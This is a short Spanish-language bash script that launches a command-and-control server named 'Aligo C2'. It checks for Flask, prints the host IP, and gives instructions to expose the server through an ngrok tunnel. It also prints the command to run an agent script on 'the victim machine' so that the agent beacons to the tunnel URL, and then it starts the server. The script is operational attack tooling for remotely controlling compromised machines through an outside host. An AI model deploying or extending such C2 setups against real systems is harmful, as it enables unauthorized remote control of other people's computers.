#!/bin/bash

# Script para iniciar el servidor C2 Aligo con HTTPS
# Muestra la configuración necesaria para los agentes

echo "============================================================"
echo "  ALIGO C2 SERVER - HTTPS Version"
echo "============================================================"
echo ""

# Verificar dependencias
if ! python3 -c "import flask" 2>/dev/null; then
    echo "[!] Flask no está instalado"
    echo "[*] Instalando dependencias..."
    pip install -r ../requirements.txt
    echo ""
fi

# Obtener IP local
SERVER_IP=$(hostname -I | awk '{print $1}')

echo "[*] Tu IP de servidor es: $SERVER_IP"
echo "[*] Puerto: 5000 (HTTP/HTTPS)"
echo ""
echo "============================================================"
echo "  CONFIGURACIÓN PARA NGROK"
echo "============================================================"
echo ""
echo "En otra terminal, ejecuta:"
echo ""
echo "  ngrok http 5000"
echo ""
echo "Luego copia la URL que aparece (ejemplo: https://abc123.ngrok.io)"
echo ""
echo "============================================================"
echo "  CONFIGURACIÓN PARA AGENTES"
echo "============================================================"
echo ""
echo "En la máquina víctima, ejecuta:"
echo ""
echo "  python3 agent_ngrok.py https://TU-URL-NGROK.ngrok.io"
echo ""
echo "Ejemplo:"
echo "  python3 agent_ngrok.py https://abc123-def456.ngrok-free.app"
echo ""
echo "============================================================"
echo ""
read -p "Presiona ENTER para iniciar el servidor... " 

python3 server.py
